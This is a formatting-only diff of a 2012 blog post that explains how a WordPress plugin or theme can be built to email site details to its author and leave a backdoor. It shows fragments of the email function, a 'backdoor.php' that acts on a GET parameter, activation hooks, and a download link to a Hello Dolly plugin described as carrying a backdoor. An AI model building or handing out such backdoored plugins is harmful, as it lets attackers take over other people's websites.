@@ -1,5 +1,5 @@
 ---
-date: '2012-07-04 11:11:42'
+date: "2012-07-04 11:11:42"
 title: How a wordpress plugin or theme hack your site
 ---
 
@@ -15,9 +15,8 @@ The other function is to leave a backdoor for the hacker to control the websit
 
 The above two functions are put into two different files:
 
- 
+The email notification function is put in a file called “email.php” :
 
-The email notification function is put in a file called “email.php” :  
 <pre><code> 
  //revised from Jim Plush’s HTML EMAIL WITH JPEG ATTACHMENTS TUTORIAL  
  function email_notification()  {
@@ -70,9 +69,10 @@ email_notification();
 
 create_file();
 
-</code></pre>  
- The backdoor function is put into a file called “backdoor.php” : 
- 
+</code></pre>
+
+The backdoor function is put into a file called “backdoor.php” :
+
 <pre><code>
 
 require_once(‘wp-blog-header.php’);  
@@ -111,8 +111,10 @@ if ($_GET["t"]){
 
 }
 
-</code></pre>  
- Finally, I put the following code into the main php file of the original theme/plugin (this example is for a plugin):  
+</code></pre>
+
+Finally, I put the following code into the main php file of the original theme/plugin (this example is for a plugin):
+
 <pre><code>  
  register_activation_hook(__FILE__, ‘my_plugin_activate’);  
  add_action(‘admin_init’, ‘my_plugin_redirect’);  
@@ -133,8 +135,4 @@ My conclusion of this tiny experiment is that even a newbie can make a  malicio
 
 Here is an example using Hello Dolly plugin (remember to change youremail@email.com to your own email and you can only use it for yourself)
 
-[Download](/content/images/uploads/2012/09/hello-dolly.zip "hello dolly with backdoor")
-
- 
-
-
+[Download](https://architech-blog.s3-ap-southeast-1.amazonaws.com/content/images/uploads/2012/09/hello-dolly.zip "hello dolly with backdoor")
